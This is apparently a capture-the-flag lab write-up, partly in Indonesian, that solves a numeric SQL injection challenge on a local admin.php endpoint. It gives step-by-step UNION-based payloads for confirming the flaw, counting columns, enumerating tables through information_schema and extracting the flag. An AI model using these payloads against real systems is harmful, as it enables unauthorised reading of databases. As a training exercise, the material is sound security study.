# Lab M4 - Numeric SQL Injection (Medium)

## Informasi Lab
- **Endpoint**: `/admin.php?id=`
- **Tipe**: Numeric Injection
- **Hint**: Role hint - int only

## Analisis

### 1. Numeric Parameter
Parameter `id` expect integer, tidak ada quotes di query:
```sql
SELECT id,name,role FROM admins WHERE id = $id
```

### 2. Test Injection
```
?id=1
?id=1 AND 1=1
?id=1 AND 1=2
```

## Solusi

### Langkah 1 - Konfirmasi Vulnerable
```
?id=1 AND 1=1  (data muncul)
?id=1 AND 1=2  (data tidak muncul)
```

### Langkah 2 - Order By untuk Kolom
```
?id=1 ORDER BY 3
?id=1 ORDER BY 4  (error = 3 kolom)
```

### Langkah 3 - UNION Injection
Karena numeric, tidak perlu quotes:
```
?id=-1 UNION SELECT 1,2,3
```

### Langkah 4 - Enumerasi Tabel
```
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
```

### Langkah 5 - Get Flag
```
?id=-1 UNION SELECT 1,flag,3 FROM flags
```

### Payload Final
```
http://localhost/m4/admin.php?id=-1 UNION SELECT 1,flag,3 FROM flags
```

### Alternatif: Subquery
```
?id=(SELECT 1 UNION SELECT flag FROM flags LIMIT 1 OFFSET 1)
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Numeric injection lebih mudah karena tidak perlu bypass quotes
- Perhatikan tipe data yang di-expect
- Gunakan nilai negatif atau 0 untuk menyembunyikan data asli
